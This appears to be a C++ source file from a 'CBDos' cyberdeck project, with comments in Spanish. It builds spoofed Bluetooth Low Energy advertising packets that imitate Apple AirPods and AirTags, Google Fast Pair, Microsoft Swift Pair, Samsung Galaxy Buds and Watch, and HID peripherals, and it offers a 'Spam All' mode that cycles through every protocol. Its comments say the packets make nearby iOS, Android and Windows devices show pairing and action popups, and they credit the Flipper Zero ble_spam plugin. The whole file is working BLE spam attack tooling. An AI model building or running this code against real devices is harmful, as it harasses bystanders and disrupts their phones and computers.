#include "cbdos/ble_payloads.hpp"

#include <cstring>

namespace cbdos {
namespace ble {

// ---------------------------------------------------------------------------
// Catálogos
// ---------------------------------------------------------------------------

// Continuity ProximityPair: cada device_id dispara el popup "nuevo dispositivo"
// de iOS para el modelo correspondiente.
static const std::vector<AppleProximityDevice> kAppleProximityDevices = {
    {"AirPods Pro",               0x0E20},
    {"AirPods Pro 2nd Gen",       0x1420},
    {"AirPods Pro 2nd Gen USB-C", 0x2420},
    {"AirPods 4 ANC",             0x2820},
    {"AirPods 4",                 0x2920},
    {"AirPods Max USB-C",         0x2B20},
    {"Beats Powerbeats Pro 2",    0x2C20},
    {"Beats Solo 3",              0x0620},
    {"AirPods Max",               0x0A20},
    {"Beats Flex",                0x1020},
    {"AirTag",                    0x0055},
    {"Hermes AirTag",             0x0030},
    {"AirPods",                   0x0220},
    {"AirPods 2nd Gen",           0x0F20},
    {"AirPods 3rd Gen",           0x1320},
    {"Powerbeats 3",              0x0320},
    {"Powerbeats Pro",            0x0B20},
    {"Beats Solo Pro",            0x0C20},
    {"Beats Studio Buds",         0x1120},
    {"Beats X",                   0x0520},
    {"Beats Studio 3",            0x0920},
    {"Beats Studio Pro",          0x1720},
    {"Beats Fit Pro",             0x1220},
    {"Beats Studio Buds+",        0x1620},
    {"Beats Solo 4",              0x2520},
    {"Beats Solo Buds",           0x2620},
    {"Powerbeats Fit",            0x2F20},
};

static const std::vector<SwiftPairPreset> kSwiftPairPresets = {
    {"Xbox Wireless Controller"},
    {"Surface Laptop Studio"},
    {"Surface Pro 9"},
    {"Surface Headphones 2"},
    {"Surface Precision Mouse"},
    {"Microsoft Audio Dock"},
    {"AirPods Pro"},
    {"AirPods Max"},
    {"Beats Studio 3"},
    {"Pixel Buds Pro"},
    {"Galaxy Buds3 Pro"},
    {"GhostESP Deck"},
    {"T-Deck Cyberdeck"},
    {"CBDos Cyberdeck"},
    {"Studio Display"},
    {"Magic Trackpad"},
    {"FBI Surveillance Van"},
    {"Rickroll Audio"},
    {"Never Gonna Give You Up"},
};

// Galaxy Buds: 24 bits de modelo. Los 6 primeros son reales; el resto son
// generadores de popup documentados por Flipper Zero.
static const uint32_t kSamsungBudsModels[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41,
    0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17, 0xD30704, 0x9DB006,
    0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519,
    0xAE073A, 0x011716, 0x123456, 0x654321, 0x789ABC, 0xDEF123,
    0x456789, 0xABC123, 0x321654, 0x987654, 0x654987, 0x321987,
};

// Galaxy Watch: modelo de 1 byte.
static const uint8_t kSamsungWatchModels[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0x21, 0x22, 0x23, 0x24,
    0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x30, 0x31, 0x32, 0x33,
    0x34, 0x35, 0x40, 0x41, 0x42, 0x60, 0x61, 0x62,
};

// Google Fast Pair: 24 bits de modelo, cada uno abre el popup de emparejamiento
// rápido en Android.
static const uint32_t kAndroidFastPairModels[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x0A0000, 0x00000B, 0x0B0000,
    0x00000D, 0x000007, 0x070000, 0x000009, 0x090000, 0x000048, 0x001000,
    0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400, 0x1E89A7,
    0x0577B1, 0x05A9BC, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494,
    0x718FA4, 0x0002F0, 0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x2D7A23,
    0x038B91, 0x02F637, 0x02D886, 0xF00001, 0xF00201, 0xF00209, 0xF00205,
    0xF00305, 0xF00E97, 0x04ACFC, 0x04AA91, 0x04AFB8, 0x05A963, 0x05AA91,
    0x05C452, 0x05C95C, 0x0602F0, 0x0603F0, 0x1E8B18, 0x1E955B, 0x06AE20,
    0x06C197, 0x06C95C, 0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C, 0x07F426,
    0x0102F0, 0x054B2D, 0x0660D7, 0x0103F0, 0x0903F0, 0x9ADB11, 0x8B66AB,
    0xD99CA1, 0x77FF67, 0xAA187F, 0xDCE9EA, 0x87B25F, 0x1448C9, 0x13B39D,
    0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62, 0x92ADC9,
};

// Continuity NearbyAction: códigos de acción que abren modales en iOS.
static const uint8_t kContinuityActions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09,
    0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};

// Presets de periféricos HID estándar (Human Interface Device).
// Nombres reales <= 18 caracteres para cumplir con el límite estricto de 31 bytes.
static const std::vector<HidPreset> kHidPresets = {
    {"MX Master 3S", 0x03C2},       // Ratón
    {"Magic Keyboard", 0x03C1},     // Teclado
    {"DualSense Wireless", 0x03C4}, // Gamepad
    {"Keychron K2 Pro", 0x03C1},    // Teclado
    {"Razer Basilisk", 0x03C2},     // Ratón
    {"Xbox Elite Pad", 0x03C4},     // Gamepad
    {"MX Keys S", 0x03C1},          // Teclado
    {"Apex Pro Wireless", 0x03C1},  // Teclado
    {"DeathAdder V3", 0x03C2}       // Ratón
};

template <typename T, size_t N>
static constexpr size_t countOf(const T (&)[N]) { return N; }

// ---------------------------------------------------------------------------
// Utilidades internas
// ---------------------------------------------------------------------------

// xorshift64* — PRNG determinista y portable. El core no puede llamar a
// esp_random() porque debe compilar también en targets sin ESP-IDF.
static uint64_t s_rngState = 0x9E3779B97F4A7C15ULL;

static uint64_t rngNext() {
    s_rngState ^= s_rngState >> 12;
    s_rngState ^= s_rngState << 25;
    s_rngState ^= s_rngState >> 27;
    return s_rngState * 0x2545F4914F6CDD1DULL;
}

static uint32_t rngRange(uint32_t bound) {
    if (bound == 0) return 0;
    return static_cast<uint32_t>(rngNext() % bound);
}

static void rngFill(uint8_t* dst, size_t len) {
    for (size_t i = 0; i < len; ++i) {
        dst[i] = static_cast<uint8_t>(rngNext() >> 24);
    }
}

// Añade una AD structure al payload respetando el límite de 31 bytes.
static bool appendAd(BleAdvPayload& out, const uint8_t* data, size_t len) {
    if (out.len + len > BLE_ADV_PAYLOAD_MAX) return false;
    memcpy(out.data + out.len, data, len);
    out.len += len;
    out.valid = true;
    return true;
}

// AD type Flags (0x01).
static bool appendFlags(BleAdvPayload& out, uint8_t flags) {
    const uint8_t ad[3] = {0x02, 0x01, flags};
    return appendAd(out, ad, sizeof(ad));
}

// ---------------------------------------------------------------------------
// Generadores por categoría
// ---------------------------------------------------------------------------

// Continuity ProximityPair (CID Apple 0x004C, tipo 0x07, tamaño 0x19).
// prefix 0x07 = popup de vinculación, prefix 0x01 = "Not Your Device".
static BleAdvPayload buildAppleProximityPair(uint8_t prefix, uint16_t deviceId) {
    BleAdvPayload p;
    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;
    buf[i++] = 0x1E;              // longitud del AD element
    buf[i++] = 0xFF;              // AD type: Manufacturer Specific
    buf[i++] = 0x4C;              // Apple company ID (little-endian)
    buf[i++] = 0x00;
    buf[i++] = 0x07;              // Continuity type: ProximityPair
    buf[i++] = 0x19;              // Continuity size: 25
    buf[i++] = prefix;
    buf[i++] = static_cast<uint8_t>(deviceId >> 8);
    buf[i++] = static_cast<uint8_t>(deviceId & 0xFF);
    buf[i++] = 0x55;              // status
    rngFill(&buf[i], 3); i += 3;  // batería L/R/case
    buf[i++] = 0x00;              // color
    buf[i++] = 0x00;              // reservado
    rngFill(&buf[i], 16); i += 16;// payload "cifrado" (relleno)
    appendAd(p, buf, i);
    return p;
}

// Continuity NearbyAction (tipo 0x0F, tamaño 0x05): modales de acción de iOS.
static BleAdvPayload buildAppleNearbyAction() {
    BleAdvPayload p;
    uint8_t action = kContinuityActions[rngRange(countOf(kContinuityActions))];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (rngRange(2) == 1)) flags--;
    if (action == 0x09 && (rngRange(2) == 1)) flags = 0x40;

    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;
    buf[i++] = 10;                // longitud del AD element
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;              // Apple company ID
    buf[i++] = 0x00;
    buf[i++] = 0x0F;              // Continuity type: NearbyAction
    buf[i++] = 0x05;              // Continuity size: 5
    buf[i++] = flags;
    buf[i++] = action;
    rngFill(&buf[i], 3); i += 3;
    appendFlags(p, 0x06);
    appendAd(p, buf, i);
    return p;
}

// Google Fast Pair: service data 0xFE2C con modelo de 3 bytes y RSSI simulado.
static BleAdvPayload buildAndroidFastPair(uint32_t model) {
    BleAdvPayload p;
    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;
    buf[i++] = 0x03;                                    // longitud
    buf[i++] = 0x03;                                    // AD type: Complete 16-bit Service UUID list
    buf[i++] = 0x2C; buf[i++] = 0xFE;                   // 0xFE2C = Google Fast Pair
    buf[i++] = 0x06;                                    // longitud
    buf[i++] = 0x16;                                    // AD type: Service Data - 16-bit UUID
    buf[i++] = 0x2C; buf[i++] = 0xFE;                   // 0xFE2C
    buf[i++] = static_cast<uint8_t>((model >> 16) & 0xFF);
    buf[i++] = static_cast<uint8_t>((model >> 8) & 0xFF);
    buf[i++] = static_cast<uint8_t>(model & 0xFF);
    buf[i++] = 0x02;                                    // length
    buf[i++] = 0x0A;                                    // TX Power
    buf[i++] = static_cast<uint8_t>(0xC0 | rngRange(0x3F));
    appendFlags(p, 0x06);
    appendAd(p, buf, i);
    return p;
}

// Microsoft Swift Pair:
// Estructura oficial compatible con Ubuntu/Linux (BlueZ), Windows y Android:
// 1. Manufacturer Specific Data (10 bytes):
//    - Longitud: 0x09
//    - AD Type: 0xFF (Manufacturer Specific)
//    - Microsoft CID: 0x06, 0x00
//    - Sub-Scenario: 0x03 (Swift Pair)
//    - Scenario flags: 0x02 (Dual Mode / BLE)
//    - Reserved RSSI: 0x80
//    - CoD (Class of Device: 3 bytes en little-endian)
// 2. Complete Local Name (AD Type 0x09):
//    - Longitud: 1 + nameLen
//    - AD Type: 0x09
//    - Nombre ASCII real (hasta 19 bytes para total <= 31 bytes)
static BleAdvPayload buildSwiftPairAdv(const char* customName) {
    const char* name = customName;
    if (name == nullptr || name[0] == '\0') {
        name = kSwiftPairPresets[rngRange(kSwiftPairPresets.size())].name;
    }
    size_t nameLen = strlen(name);
    if (nameLen > 19) nameLen = 19;

    // CoD (Class of Device) según tipo de periférico:
    // Gamepad: 0x002508, Ratón: 0x002580, Auriculares: 0x200408, Audio/Periférico genérico: 0x240404
    uint32_t cod = 0x240404;
    if (strstr(name, "Xbox") != nullptr) {
        cod = 0x002508;
    } else if (strstr(name, "Mouse") != nullptr) {
        cod = 0x002580;
    } else if (strstr(name, "Headphones") != nullptr || strstr(name, "Buds") != nullptr || strstr(name, "AirPods") != nullptr) {
        cod = 0x200408;
    }

    BleAdvPayload p;
    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;

    // Bloque 1: Manufacturer Specific Data (10 bytes)
    buf[i++] = 9;                       // Longitud del bloque
    buf[i++] = 0xFF;                    // AD Type: Manufacturer Specific
    buf[i++] = 0x06; buf[i++] = 0x00;   // Microsoft CID (0x0006)
    buf[i++] = 0x03;                    // Swift Pair beacon ID
    buf[i++] = 0x02;                    // Sub-scenario (Dual Mode / BLE)
    buf[i++] = 0x80;                    // RSSI byte reservado
    buf[i++] = static_cast<uint8_t>(cod & 0xFF);
    buf[i++] = static_cast<uint8_t>((cod >> 8) & 0xFF);
    buf[i++] = static_cast<uint8_t>((cod >> 16) & 0xFF);

    // Bloque 2: Complete Local Name (AD Type 0x09) - Requerido por BlueZ (Ubuntu)
    buf[i++] = static_cast<uint8_t>(1 + nameLen); // Longitud
    buf[i++] = 0x09;                              // AD Type: Complete Local Name
    memcpy(&buf[i], name, nameLen);
    i += nameLen;

    appendAd(p, buf, i);
    return p;
}

// Galaxy Buds: ocupa los 31 bytes completos, por lo que no admite AD de Flags.
static BleAdvPayload buildSamsungBuds() {
    BleAdvPayload p;
    uint32_t model = kSamsungBudsModels[rngRange(countOf(kSamsungBudsModels))];
    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;
    buf[i++] = 27;                 // longitud declarada
    buf[i++] = 0xFF;
    buf[i++] = 0x75; buf[i++] = 0x00;   // Samsung CID
    buf[i++] = 0x42; buf[i++] = 0x09;   // SmartThings Find
    buf[i++] = 0x81; buf[i++] = 0x02;
    buf[i++] = 0x14; buf[i++] = 0x15;
    buf[i++] = 0x03; buf[i++] = 0x21;
    buf[i++] = 0x01; buf[i++] = 0x09;
    buf[i++] = static_cast<uint8_t>((model >> 16) & 0xFF);
    buf[i++] = static_cast<uint8_t>((model >> 8) & 0xFF);
    buf[i++] = 0x01;
    buf[i++] = static_cast<uint8_t>(model & 0xFF);
    buf[i++] = 0x06; buf[i++] = 0x3C; buf[i++] = 0x94; buf[i++] = 0x8E;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0xC7; buf[i++] = 0x00;
    // Registro final truncado (declara 0x10 pero solo trae 2 bytes). Portado
    // del plugin ble_spam de Flipper Zero: sin él, el escáner de Samsung no
    // reconoce el paquete.
    buf[i++] = 0x10; buf[i++] = 0xFF; buf[i++] = 0x75;
    appendAd(p, buf, i);
    return p;
}

// Galaxy Watch: modelo de 1 byte, con hueco para AD de Flags.
static BleAdvPayload buildSamsungWatch() {
    BleAdvPayload p;
    uint8_t model = kSamsungWatchModels[rngRange(countOf(kSamsungWatchModels))];
    const uint8_t buf[15] = {
        0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
    };
    appendFlags(p, 0x06);
    appendAd(p, buf, sizeof(buf));
    return p;
}

// Periféricos HID estándar (Human Interface Device):
// Formato universal 100% visible en BlueZ (Linux/Ubuntu), Android, Windows y macOS.
// 1. Flags (3 bytes): 0x02, 0x01, 0x06
// 2. 16-bit Service UUID (4 bytes): 0x03, 0x03, 0x12, 0x18 (UUID 0x1812 HID Service)
// 3. Appearance (4 bytes): 0x03, 0x19, appearance_lsb, appearance_msb
// 4. Complete Local Name (2 + nameLen bytes): (nameLen + 1), 0x09, name...
// Total: 3 + 4 + 4 + 2 + nameLen = 13 + nameLen <= 31 (nameLen <= 18 chars)
static BleAdvPayload buildHidPeripheralAdv(const char* customName, uint16_t appearance) {
    const char* name = customName;
    uint16_t app = appearance;
    if (name == nullptr || name[0] == '\0') {
        const auto& p = kHidPresets[rngRange(kHidPresets.size())];
        name = p.name;
        app = p.appearance;
    }
    size_t nameLen = strlen(name);
    if (nameLen > 18) nameLen = 18;

    BleAdvPayload p;
    appendFlags(p, 0x06);

    // AD Type 0x03: Complete List of 16-bit Service UUIDs (0x1812 = HID Service)
    const uint8_t srvAd[4] = {0x03, 0x03, 0x12, 0x18};
    appendAd(p, srvAd, sizeof(srvAd));

    // AD Type 0x19: Appearance
    const uint8_t appAd[4] = {
        0x03, 0x19,
        static_cast<uint8_t>(app & 0xFF),
        static_cast<uint8_t>(app >> 8)
    };
    appendAd(p, appAd, sizeof(appAd));

    // AD Type 0x09: Complete Local Name (nombre visible en todos los escáneres)
    uint8_t nameAd[20];
    nameAd[0] = static_cast<uint8_t>(nameLen + 1);
    nameAd[1] = 0x09;
    memcpy(&nameAd[2], name, nameLen);
    appendAd(p, nameAd, nameLen + 2);

    return p;
}

// Baliza genérica: Flags + lista de UUID de 16 bits + Appearance + nombre.
BleAdvPayload BlePayloadRegistry::buildGenericBeacon(const char* deviceName,
                                                    uint16_t uuid16,
                                                    uint16_t major,
                                                    uint16_t minor,
                                                    int8_t txPower) {
    BleAdvPayload p;
    appendFlags(p, 0x06);

    uint8_t uuidAd[4] = {
        0x03, 0x03,
        static_cast<uint8_t>(uuid16 & 0xFF), static_cast<uint8_t>(uuid16 >> 8)
    };
    appendAd(p, uuidAd, sizeof(uuidAd));

    uint8_t appAd[5] = {
        0x03, 0x19,
        static_cast<uint8_t>(txPower & 0xFF),
        static_cast<uint8_t>(major & 0xFF), static_cast<uint8_t>(minor & 0xFF)
    };
    appendAd(p, appAd, sizeof(appAd));

    if (deviceName != nullptr && deviceName[0] != '\0') {
        size_t n = strlen(deviceName);
        if (n > 26) n = 26;   // cabe en 31 menos los 4 bytes de cabecera
        uint8_t nameAd[BLE_ADV_PAYLOAD_MAX];
        nameAd[0] = static_cast<uint8_t>(n + 1);
        nameAd[1] = 0x09;     // Complete Local Name
        memcpy(&nameAd[2], deviceName, n);
        appendAd(p, nameAd, n + 2);
    }
    return p;
}

// ---------------------------------------------------------------------------
// Fachada pública
// ---------------------------------------------------------------------------

BleAdvPayload BlePayloadRegistry::build(BlePayloadCategory category, int variantIndex) {
    switch (category) {
        case BlePayloadCategory::ApplePairing: {
            const auto& devices = kAppleProximityDevices;
            uint16_t id;
            if (variantIndex <= 0 || variantIndex > static_cast<int>(devices.size())) {
                id = devices[rngRange(devices.size())].deviceId;
            } else {
                id = devices[variantIndex - 1].deviceId;
            }
            return buildAppleProximityPair(0x07, id);
        }
        case BlePayloadCategory::AppleNotYourDevice: {
            const auto& devices = kAppleProximityDevices;
            uint16_t id;
            if (variantIndex <= 0 || variantIndex > static_cast<int>(devices.size())) {
                id = devices[rngRange(devices.size())].deviceId;
            } else {
                id = devices[variantIndex - 1].deviceId;
            }
            return buildAppleProximityPair(0x01, id);
        }
        case BlePayloadCategory::AppleAction:
            return buildAppleNearbyAction();
        case BlePayloadCategory::AndroidFastPair: {
            uint32_t model;
            if (variantIndex >= 0 && variantIndex < static_cast<int>(countOf(kAndroidFastPairModels))) {
                model = kAndroidFastPairModels[variantIndex];
            } else {
                model = kAndroidFastPairModels[rngRange(countOf(kAndroidFastPairModels))];
            }
            return buildAndroidFastPair(model);
        }
        case BlePayloadCategory::WindowsSwiftPair: {
            size_t n = kSwiftPairPresets.size();
            // Índice 0 = Random / All (ciclar automáticamente)
            if (variantIndex <= 0 || variantIndex > static_cast<int>(n)) {
                return buildSwiftPairAdv(nullptr);
            }
            return buildSwiftPairAdv(kSwiftPairPresets[variantIndex - 1].name);
        }
        case BlePayloadCategory::SamsungBuds:
            return buildSamsungBuds();
        case BlePayloadCategory::SamsungWatch:
            return buildSamsungWatch();
        case BlePayloadCategory::GenericBeacon:
            return buildGenericBeacon("CBDos", 0x1812, 1, 1, 0xC0);
        case BlePayloadCategory::HidPeripherals: {
            size_t n = kHidPresets.size();
            // Índice 0 = Random / All
            if (variantIndex <= 0 || variantIndex > static_cast<int>(n)) {
                return buildHidPeripheralAdv(nullptr, 0);
            }
            const auto& preset = kHidPresets[variantIndex - 1];
            return buildHidPeripheralAdv(preset.name, preset.appearance);
        }
        case BlePayloadCategory::SpamAll: {
            // Kitchen Sink: cicla secuencialmente entre todos los protocolos
            static uint8_t s_spamIndex = 0;
            static const BlePayloadCategory s_protocols[] = {
                BlePayloadCategory::ApplePairing,
                BlePayloadCategory::AppleAction,
                BlePayloadCategory::AppleNotYourDevice,
                BlePayloadCategory::AndroidFastPair,
                BlePayloadCategory::WindowsSwiftPair,
                BlePayloadCategory::SamsungBuds,
                BlePayloadCategory::SamsungWatch,
                BlePayloadCategory::HidPeripherals
            };
            BlePayloadCategory cat = s_protocols[s_spamIndex % countOf(s_protocols)];
            s_spamIndex++;
            return build(cat, 0); // Índice 0 = Random / All para cada categoría
        }
    }
    BleAdvPayload empty;
    return empty;
}

BleAdvPayload BlePayloadRegistry::buildSwiftPair(const char* customName) {
    return buildSwiftPairAdv(customName);
}

std::vector<std::string> BlePayloadRegistry::getVariantNames(BlePayloadCategory category) {
    std::vector<std::string> out;
    switch (category) {
        case BlePayloadCategory::ApplePairing:
        case BlePayloadCategory::AppleNotYourDevice:
            out.emplace_back("Random / All (Ciclo modelos)");
            for (const auto& d : kAppleProximityDevices) out.emplace_back(d.name);
            break;
        case BlePayloadCategory::AndroidFastPair:
            out.emplace_back("Random / All");
            break;
        case BlePayloadCategory::WindowsSwiftPair:
            out.emplace_back("Random / All (Ciclo automático)");
            for (const auto& p : kSwiftPairPresets) out.emplace_back(p.name);
            break;
        case BlePayloadCategory::AppleAction:
            out.emplace_back("Nearby Action (todos)");
            break;
        case BlePayloadCategory::SamsungBuds:
            out.emplace_back("Galaxy Buds (todos)");
            break;
        case BlePayloadCategory::SamsungWatch:
            out.emplace_back("Galaxy Watch (todos)");
            break;
        case BlePayloadCategory::GenericBeacon:
            out.emplace_back("Baliza HID genérica");
            break;
        case BlePayloadCategory::HidPeripherals:
            out.emplace_back("Random / All (Ciclo automático)");
            for (const auto& h : kHidPresets) out.emplace_back(h.name);
            break;
        case BlePayloadCategory::SpamAll:
            out.emplace_back("Todos los protocolos (Ciclo activo)");
            break;
    }
    return out;
}

size_t BlePayloadRegistry::getVariantCount(BlePayloadCategory category) {
    return getVariantNames(category).size();
}

const char* BlePayloadRegistry::getCategoryName(BlePayloadCategory category) {
    switch (category) {
        case BlePayloadCategory::ApplePairing:      return "AppleJuice";
        case BlePayloadCategory::AppleAction:       return "Continuity Action";
        case BlePayloadCategory::AppleNotYourDevice:return "Not Your Device";
        case BlePayloadCategory::AndroidFastPair:   return "Google Fast Pair";
        case BlePayloadCategory::WindowsSwiftPair:  return "MS Swift Pair";
        case BlePayloadCategory::SamsungBuds:       return "Galaxy Buds";
        case BlePayloadCategory::SamsungWatch:      return "Galaxy Watch";
        case BlePayloadCategory::GenericBeacon:     return "Baliza genérica";
        case BlePayloadCategory::HidPeripherals:    return "HID Peripherals";
        case BlePayloadCategory::SpamAll:           return "Spam All (Kitchen Sink)";
    }
    return "Desconocido";
}

const std::vector<AppleProximityDevice>& BlePayloadRegistry::getAppleProximityDevices() {
    return kAppleProximityDevices;
}

const std::vector<SwiftPairPreset>& BlePayloadRegistry::getSwiftPairPresets() {
    return kSwiftPairPresets;
}

const std::vector<HidPreset>& BlePayloadRegistry::getHidPresets() {
    return kHidPresets;
}

} // namespace ble
} // namespace cbdos